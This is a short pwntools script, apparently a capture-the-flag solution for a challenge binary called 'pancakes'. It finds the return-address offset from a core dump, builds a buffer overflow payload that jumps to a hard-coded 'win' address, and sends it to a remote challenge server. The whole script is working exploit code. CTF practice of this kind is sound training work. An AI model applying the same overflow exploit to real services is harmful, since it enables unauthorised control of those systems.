#calling win func

#!/usr/bin/python3

from pwn import *

p = process('./pancakes')

p.recvuntil('How many pancakes do you want?')
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8),n=8)

payload  = padding * b'A'
payload += p64(0x40098b)

p = remote('jh2i.com', 50021)
p.recvuntil('How many pancakes do you want?')
p.sendline(payload)
p.stream()
